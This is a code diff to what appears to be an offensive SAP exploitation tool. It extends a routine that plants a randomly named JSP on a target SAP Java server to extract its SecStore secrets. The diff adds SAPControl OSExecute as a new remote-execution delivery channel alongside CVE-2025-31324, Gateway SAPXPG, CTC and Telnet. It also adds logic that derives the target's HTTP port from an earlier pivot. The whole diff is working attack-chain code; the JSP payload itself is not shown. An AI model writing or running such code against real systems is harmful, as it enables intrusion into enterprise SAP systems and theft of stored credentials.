@@ -129,6 +129,29 @@ def extract_java_secstore(node: SAPNode, state: SAPMAPState) -> dict:
             candidate = 50000 + nr * 100
             if candidate in inst.ports:
                 http_port = candidate; break
+    # SAPControl pivot fallback: when Test Connection landed a
+    # SAPControl OSExecute pivot on this node, the pivot's URL
+    # points at 5NN13/14 — the Java HTTP port for THAT instance
+    # sits at 5NN00/01.  Derives the port even when no earlier
+    # scan discovered java_http (typical of firewalled Java
+    # stacks the operator can only reach through Type-G).
+    if not http_port:
+        _sc_pivot = getattr(node, "_cached_sapcontrol_pivot", None)
+        if _sc_pivot and _sc_pivot.get("url"):
+            try:
+                from urllib.parse import urlparse as _up
+                _pu = _up(_sc_pivot["url"])
+                _p = _pu.port or 0
+                if 50000 <= _p <= 59999 and _p % 100 in (13, 14):
+                    _inst_nr_from_pivot = (_p - 50000) // 100
+                    http_port = 50000 + _inst_nr_from_pivot * 100
+                    jsp_scheme = "http"
+                    print(f"[+] {node.sid}: derived Java HTTP port "
+                          f"{http_port} from SAPControl pivot "
+                          f"{_sc_pivot['url']} (inst "
+                          f"{_inst_nr_from_pivot:02d})")
+            except Exception:
+                pass
     if not http_port:
         result["error"] = "no Java HTTP port known for JSP deployment"
         return result
@@ -137,12 +160,19 @@ def extract_java_secstore(node: SAPNode, state: SAPMAPState) -> dict:
     java_inst_port = http_port - 1 if jsp_scheme == "https" else http_port
     java_inst = (java_inst_port - 50000) // 100
 
-    # Pick delivery path (CVE-31324 > GW > CTC > Telnet)
+    # Pick delivery path (CVE-31324 > GW > SAPControl OSExecute >
+    # CTC > Telnet).  SAPControl OSExecute goes after GW because
+    # GW+SXPG typically reaches _deploy_jsp_via_gw's exec channel
+    # too — but when neither classical vuln applies, the operator's
+    # verified Type-G pivot is the intended route.
     use_cve = node.cve_2025_31324_vulnerable
     use_gw  = node.gw_vulnerable
-    use_ctc    = (not use_cve) and (not use_gw) and _ctc_deploy_available(node)
-    use_telnet = (not use_cve) and (not use_gw) and (not use_ctc) \
-                    and _telnet_deploy_available(node)
+    use_sapcontrol = (not use_cve) and (not use_gw) and bool(
+        getattr(node, "_cached_sapcontrol_pivot", None))
+    use_ctc    = (not use_cve) and (not use_gw) and (not use_sapcontrol) \
+                    and _ctc_deploy_available(node)
+    use_telnet = (not use_cve) and (not use_gw) and (not use_sapcontrol) \
+                    and (not use_ctc) and _telnet_deploy_available(node)
 
     import base64 as _b64, random as _r, string as _s
     jsp_name = "ss" + "".join(_r.choice(_s.ascii_lowercase) for _ in range(7)) + ".jsp"
@@ -152,6 +182,7 @@ def extract_java_secstore(node: SAPNode, state: SAPMAPState) -> dict:
                f":{http_port}/irj/{jsp_name}")
     delivery = ("CVE-2025-31324" if use_cve
                 else "GW SAPXPG"  if use_gw
+                else "SAPControl OSExecute" if use_sapcontrol
                 else "CTC ConfigServlet (UME admin)" if use_ctc
                 else "Telnet (UME admin)" if use_telnet
                 else "NONE")
@@ -180,11 +211,20 @@ def extract_java_secstore(node: SAPNode, state: SAPMAPState) -> dict:
             return result
         print(f"[+] {node.sid}:   wrote {w['chunks_written']} chunk(s) of "
               f"base64 + certutil-decoded into {target_path}")
-    elif use_gw:
+    elif use_gw or use_sapcontrol:
+        # Both channels write the JSP via the SAME chunked-echo /
+        # base64-decode primitive.  The only difference is which
+        # OS-exec transport the chunks travel over — GW SAPXPG (the
+        # named case) vs SAPControl OSExecute (auto-selected inside
+        # execute_os_command when node._cached_sapcontrol_pivot is
+        # present, from commit 8387c9b).  Same helper, same call
+        # site, transport picked one layer down.
         w = _deploy_jsp_via_gw(node, _ss.SECSTORE_JSP.encode("utf-8"),
                                  target_path, label="SecStore JSP")
         if not w.get("success"):
-            result["error"] = w.get("error", "GW deploy failed")
+            _channel = "SAPControl OSExecute" if use_sapcontrol else "GW"
+            result["error"] = w.get("error",
+                                      f"{_channel} deploy failed")
             return result
         print(f"[+] {node.sid}:   wrote {w.get('bytes_written', 0)} bytes "
               f"via {w.get('method', 'gw')}")
